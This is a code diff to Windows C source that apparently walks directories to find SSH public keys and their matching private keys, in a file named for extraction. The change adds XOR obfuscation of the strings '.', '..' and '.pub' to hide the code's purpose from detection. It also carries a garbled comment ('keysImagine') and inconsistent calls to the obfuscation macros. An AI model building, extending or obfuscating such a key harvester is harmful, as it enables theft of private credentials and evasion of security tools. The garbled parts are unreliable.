@@ -3,10 +3,11 @@
 #include <shlwapi.h>
 #include <stdio.h>
 #include <string.h>
+#include <wchar.h>
 #include <windows.h>
 
 #include "extract_file.h"
-
+#include "obfuscation.h"
 static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
                            size_t lenPkFile, sshkey keysTab[MAX_KEY_FILES],
                            DWORD32 *index) {
@@ -23,8 +24,7 @@ static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
   // And removing the .pub
   wcsncpy(skName, pkName, lenPkFile - 4);
   skName[lenPkFile - 4] = L'\0';
-
-  // Getting the path name of the ssh keys
+  // Getting the path name of the ssh keysImagine
   _snwprintf(skNamePath, sizeof(skNamePath), L"%ls\\%ls", directory, skName);
   _snwprintf(pkNamePath, sizeof(pkNamePath), L"%ls\\%ls", directory, pkName);
 
@@ -34,8 +34,10 @@ static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
   DWORD attributes = GetFileAttributesW(skNamePath);
   if (attributes == INVALID_FILE_ATTRIBUTES ||
       (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
-    wprintf(L"[ERROR] find_key_pair: couldn't find private key for %ls\n",
-            pkNamePath);
+    wchar_t error_msg[] =
+        L"[ERROR] find_key_pair: couldn't find private key for %ls\n";
+    // XOR_STR(error_msg, wcslen(error_msg));
+    wprintf(error_msg, pkNamePath);
     return;
   }
 
@@ -79,8 +81,14 @@ static void find_ssh_key_recursively(const PWSTR directory,
   do {
     const WCHAR *fileName = findData.cFileName;
 
+    wchar_t single_dot[] = L"\x04";      // .
+    wchar_t double_dot[] = L"\x04\x04";  // ..
+    XOR_WSTR(single_dot, wcslen(single_dot));
+    XOR_WSTR(double_dot, wcslen(double_dot));
+
     // Ignore "." and ".."
-    if (wcscmp(fileName, L".") == 0 || wcscmp(fileName, L"..") == 0) {
+    if (wcscmp(fileName, single_dot) == 0 ||
+        wcscmp(fileName, double_dot) == 0) {
       continue;
     }
 
@@ -98,10 +106,14 @@ static void find_ssh_key_recursively(const PWSTR directory,
       // checking if the end of the file is .pub
       // i.e. ssh public key
       // also checking if we can store more keys
+
+      wchar_t file_extension[] = L"\x04\x5a\x5f\x48";  // .pub
+      XOR_STR(file_extension, wcslen(file_extension));
+
       if (*indexKeysTab >= MAX_KEY_FILES) {
         break;
-      } else if (wcscmp(fileName + (lenFileName - 4), L".pub") == 0) {
-        wprintf(L"File : %s\\%s\n", directory, fileName);
+      } else if (wcscmp(fileName + (lenFileName - 4), file_extension) == 0) {
+        wprintf(L"File : %ls\\%ls\n", directory, fileName);
         find_keys_pair(directory, fileName, lenFileName, keysFilenamesTab,
                        indexKeysTab);
       }
